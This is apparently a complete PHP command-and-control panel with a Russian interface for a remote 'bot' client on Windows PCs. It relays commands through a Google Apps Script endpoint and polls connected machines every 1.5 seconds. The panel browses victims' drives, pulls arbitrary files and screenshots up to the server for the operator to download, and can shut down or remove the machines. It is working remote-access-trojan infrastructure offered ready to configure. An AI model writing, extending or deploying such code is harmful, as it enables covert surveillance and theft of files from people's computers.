<?php
ob_start(); 
session_start();
error_reporting(E_ALL); ini_set('display_errors', 1);

// !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
$api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";

$cache_dir = __DIR__ . '/explorer_cache/';
if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);

// ПОДДЕРЖКА AJAX ЗАПРОСОВ ДЛЯ МГНОВЕННОГО ОБНОВЛЕНИЯ БЕЗ ПЕРЕЗАГРУЗКИ
if (isset($_GET['api_refresh'])) {
    header('Content-Type: application/json');
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['api_refresh']);
    
    $tree_file = $cache_dir . $dev_id . '_tree.txt';
    $path_file = $cache_dir . $dev_id . '_path.txt';
    $last_file_ptr = $cache_dir . $dev_id . '_lastfile.txt';
    
    $items = file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [];
    $cur_path = file_exists($path_file) ? file_get_contents($path_file) : 'C:\\';
    $last_download = file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '';

    echo json_encode([
        "current_path" => $cur_path,
        "last_file" => $last_download,
        "items" => $items
    ]);
    exit;
}

// 1. ПРИЕМ ДАННЫХ И ФАЙЛОВ ОТ БОТА
if (isset($_POST['screenshot_device_id'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
    
    if (isset($_POST['folder_structure'])) {
        file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
        file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
        echo "SERVER_SAVED_STRUCTURE";
        exit;
    }

    if (isset($_FILES['downloaded_file'])) {
        $upload_dir = __DIR__ . '/downloads/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $filename = basename($_FILES['downloaded_file']['name']);
        $target_file = $upload_dir . $dev_id . '_' . $filename;
        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
            echo "SERVER_SAVED_FILE";
        }
        exit;
    }
    
    if (isset($_FILES['screenshot_file'])) {
        $upload_dir = __DIR__ . '/screenshots/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $target_file = $upload_dir . 'screen_' . $dev_id . '.jpg';
        move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $target_file);
        echo "SERVER_SAVED_SCREENSHOT";
        exit;
    }
}

// 2. СКАЧИВАНИЕ ФАЙЛОВ В БРАУЗЕР
if (isset($_GET['get_file']) && isset($_GET['dev'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
    $filename = basename($_GET['get_file']);
    $file = __DIR__ . '/downloads/' . $dev_id . '_' . $filename;
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        readfile($file);
    } else { echo "Файл не найден."; }
    exit;
}

if (isset($_GET['download_screen'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
    $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
    if (file_exists($file)) {
        header('Content-Type: image/jpeg');
        header('Content-Disposition: attachment; filename="screenshot_'.$dev_id.'.jpg"');
        readfile($file);
    } else { echo "Скриншот не найден."; }
    exit;
}

// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $action = isset($_POST["action"]) ? trim($_POST["action"]) : ""; 
    $device_id = isset($_POST["device_id"]) ? trim($_POST["device_id"]) : "";
    $target_path = isset($_POST["target_path"]) ? trim($_POST["target_path"]) : "";

    if (!empty($action) && !empty($device_id)) {
        if (($action === "get_files" || $action === "download_file") && !empty($target_path)) {
            $action = $action . "::" . $target_path;
        }
        $ch = curl_init($api); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["action" => $action, "device_id" => $device_id])); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
        curl_exec($ch); 
        curl_close($ch);
    }
    // Если запрос был отправлен через JS (FormData), не перезагружаем страницу!
    if(isset($_POST['js_async'])) { echo "OK"; exit; }
    
    header("Location: " . $_SERVER['PHP_SELF']); 
    exit;
}

function getData($url) {
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
    $res = curl_exec($ch); curl_close($ch); return json_decode($res, true) ?: [];
}
$devices = getData($api);
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Панель Управления REALTIME</title>
<style>
body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
.header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
.sync-indicator{ font-size:12px; color:#34d399; font-weight: bold;}
.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1s infinite; }
@keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; position: relative;}
.online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
.name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
.online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
.row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
.blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
.green { background:#059669; color:white; } .green:hover{ background:#047857; }
.orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
.red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
.gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:280px; overflow-y:auto; }
.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #1f2937; font-size:12px; }
.exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
.exp-btn:hover { text-decoration:underline; color:#93c5fd; }
</style>
</head>
<body>

<div class="header">
    <span>🖥 Центральная Панель Управления [REALTIME V2]</span>
    <div class="sync-indicator"><span class="dot"></span>Живое AJAX-обновление (1.5с)</div>
</div>

<div class="container">
    <?php 
    foreach($devices as $d): 
        $dev_id = $d["device_id"] ?? ""; if (empty($dev_id)) continue;

        $time_raw = $d["time"] ?? ""; $last = 0;
        if (!empty($time_raw)) {
            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
            }
            $last = @strtotime($time_raw);
        }
        $isOnline = ((time() - $last) <= 35 && $last > 0);
        $card_class = $isOnline ? "online-card" : "";
    ?>
    <div class="card <?=$card_class?>" id="card_<?=$dev_id?>">
        <div class="name"><?=htmlspecialchars($d["name"] ?? "Неизвестный ПК")?></div>
        <div class="status <?=($isOnline?"online":"offline")?>"><?=($isOnline?"В сети":"Не в сети")?></div>
        <div class="row"><b>ID железа:</b> <span style="font-family:monospace;"><?=$dev_id?></span></div>

        <hr style="border-color:#1f2937; margin:12px 0;">

        <div class="name" style="font-size:14px; margin-top:10px;">📂 Онлайн Проводник ПК:</div>
        
        <span id="path_text_<?=$dev_id?>" style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Загрузка пути...</span>

        <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('<?=$dev_id?>', 'get_files', 'C:\\\\')">🔄 Обновить / Корень диска C:</button>

        <div class="explorer-box" id="explorer_box_<?=$dev_id?>">
            <span style='font-size:11px; color:#4b5563;'>Синхронизация структуры...</span>
        </div>

        <div id="download_container_<?=$dev_id?>"></div>

        <hr style="border-color:#1f2937; margin:15px 0;">

        <button type="button" class="blue" onclick="sendCmdAsync('<?=$dev_id?>', 'take_screenshot')">📸 Запросить Скриншот</button>
        
        <?php if (file_exists(__DIR__ . '/screenshots/screen_' . $dev_id . '.jpg')): ?>
            <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank" style="margin-bottom:6px;">📥 Посмотреть скриншот экрана</a>
        <?php endif; ?>

        <hr style="border-color:#1f2937; margin:15px 0;">

        <button type="button" class="orange" onclick="if(confirm('Закрыть программу бота?')) sendCmdAsync('<?=$dev_id?>', 'stop_client')">❌ Закрыть программу бота</button>
        <button type="button" class="red" onclick="if(confirm('Выключить ПК?')) sendCmdAsync('<?=$dev_id?>', 'shutdown')">💻 Выключить компьютер</button>
        <button type="button" class="gray-danger" onclick="if(confirm('Забыть ПК?')) sendCmdAsync('<?=$dev_id?>', 'delete')">🗑 Забыть ПК (Удалить)</button>
    </div>
    <?php endforeach; ?>
</div>

<script>
// ФУНКЦИЯ ДЛЯ КЛИКОВ ПО КНОПКАМ БЕЗ ПЕРЕЗАГРУЗКИ СТРАНИЦЫ
function sendCmdAsync(deviceId, action, targetPath = '') {
    let formData = new FormData();
    formData.append('action', action);
    formData.append('device_id', deviceId);
    formData.append('target_path', targetPath);
    formData.append('js_async', '1');

    fetch(window.location.href, {
        method: 'POST',
        body: formData
    }).then(res => {
        console.log('Команда отправлена:', action, targetPath);
    }).catch(err => console.error(err));
}

// ГЛАВНЫЙ СУПЕР-ТАЙМЕР: ОБНОВЛЯЕТ СОДЕРЖИМОЕ ПРОВОДНИКА КАЖДЫЕ 1.5 СЕКУНДЫ ВТИХАРЯ!
function startRealtimeMonitor() {
    const devicesIds = [<?php 
        $ids = [];
        foreach($devices as $d) { if(!empty($d['device_id'])) $ids[] = "'".$d['device_id']."'"; }
        echo implode(',', $ids);
    ?>];

    setInterval(() => {
        devicesIds.forEach(id => {
            fetch('?api_refresh=' + encodeURIComponent(id))
            .then(response => response.json())
            .then(data => {
                // 1. Обновляем текст пути
                document.getElementById('path_text_' + id).innerText = 'Путь: ' + data.current_path;

                // 2. Строим дерево папок динамически
                let box = document.getElementById('explorer_box_' + id);
                let html = '';

                // Если папка не корень, выводим кнопку "Назад"
                if (data.current_path !== 'C:\\' && data.current_path !== 'C:/' && data.current_path !== '') {
                    // Извлекаем родительскую директорию
                    let parts = data.current_path.split(/[\\\/]/);
                    parts.pop(); if(parts.length <= 1) parts = ['C:'];
                    let parentPath = parts.join('\\\\');
                    if(!parentPath.endsWith('\\')) parentPath += '\\\\';

                    html += `<div class="exp-item">
                        <button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад к пред. папке]</button>
                    </div>`;
                }

                if (!data.items || data.items.length === 0) {
                    html += `<span style='font-size:11px; color:#4b5563;'>Папка пуста или ждет обновления кэша...</span>`;
                } else {
                    data.items.forEach(item => {
                        // Экранируем слеши для JS аргументов
                        let safePath = item.path.replace(/\\/g, '\\\\');
                        if (item.is_dir) {
                            html += `<div class="exp-item">
                                <button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button>
                            </div>`;
                        } else {
                            html += `<div class="exp-item">
                                <button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Запросить скачивание файла?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button>
                                <span style="font-size:10px; color:#4b5563;">${item.size}</span>
                            </div>`;
                        }
                    });
                }
                box.innerHTML = html;

                // 3. Рендерим кнопку скачивания файла, если он готов
                let dlContainer = document.getElementById('download_container_' + id);
                if (data.last_file && data.last_file.trim() !== '') {
                    dlContainer.innerHTML = `<a href="?get_file=${encodeURIComponent(data.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 12px rgba(16,185,129,0.5);">💾 Скачать на свой ПК: ${data.last_file}</a>`;
                } else {
                    dlContainer.innerHTML = '';
                }
            })
            .catch(err => console.error("Ошибка обновления устройства " + id, err));
        });
    }, 1500); // 1.5 секунды!
}

// Запуск при старте страницы
window.onload = startRealtimeMonitor;
</script>
</body>
</html>
